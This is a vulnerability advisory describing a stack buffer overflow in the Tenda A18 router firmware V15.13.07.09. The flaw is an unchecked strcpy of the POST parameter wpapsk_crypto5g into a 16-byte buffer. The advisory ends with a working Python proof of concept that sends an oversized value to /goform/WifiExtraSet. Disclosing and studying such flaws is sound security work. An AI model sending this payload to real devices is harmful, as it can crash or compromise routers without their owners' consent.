## Overview

- The device's official website: https://www.tenda.com.cn/product/A18.html
- Firmware download website: https://www.tenda.com.cn/download/detail-2760.html

## Affected version

V15.13.07.09

## Vulnerability details

The Tenda A18 V15.13.07.09 has a stack overflow vulnerability located in the `fromSetWirelessRepeat` function. This function accepts the `wpapsk_crypto5g` parameter from a POST request by variable `wpapsk_cryptoc` and passes it to the `set_repeat5` function.

![image-20240307200548275](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307200548275.png)

![image-20240307200611759](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307200611759.png)

Within `set_repeat5`, the array `wpapsk_cryptovalue` is fixed at 16 bytes. However, since the user has control over the input of `wpapsk_crypto5g`, the statement `strcpy(wpapsk_cryptovalue, wpapsk_crypto);` leads to a buffer overflow. The user-supplied `wpapsk_crypto5g` can exceed the capacity of the `wpapsk_cryptovalue` array, thus triggering this security vulnerability.

![image-20240307200632291](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307200632291.png)

![image-20240307200640100](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307200640100.png)

We set both variables `configured2_4g`  and `configured5g`  equal to the string 'true' to trigger the execution of the vulnerable code section within the `strcmp` if condition.

![image-20240307200712324](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307200712324.png)

## PoC

```python
import requests

ip = '192.168.84.101'
url = f'http://{ip}/goform/WifiExtraSet'

payload = {
    'configured2_4g': 'true',
    'configured5g': 'true',
    'originSsid2_4g': '1234',
    'encode2_4g': '1234',
    'security2_4g': 'wpapsk',
    'wpapsk_type2_4g': 'wpa2',
    'wpapsk_crypto2_4g': 'true',
    'wpapsk_key2_4g': '1234567890',
    'extSSID5g':'true',
    'originSsid5g': '1234',
    'encode5g': '1234',
    'security5g': 'wpapsk',
    'wpapsk_type5g': 'wpa2',
    'wpapsk_crypto5g': 'a' * 0x100,
    'wpapsk_key5g': '1234567890'
} # c
res = requests.post(url=url, data=payload)

print(res)
```

![image-20240307200828364](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307200828364.png)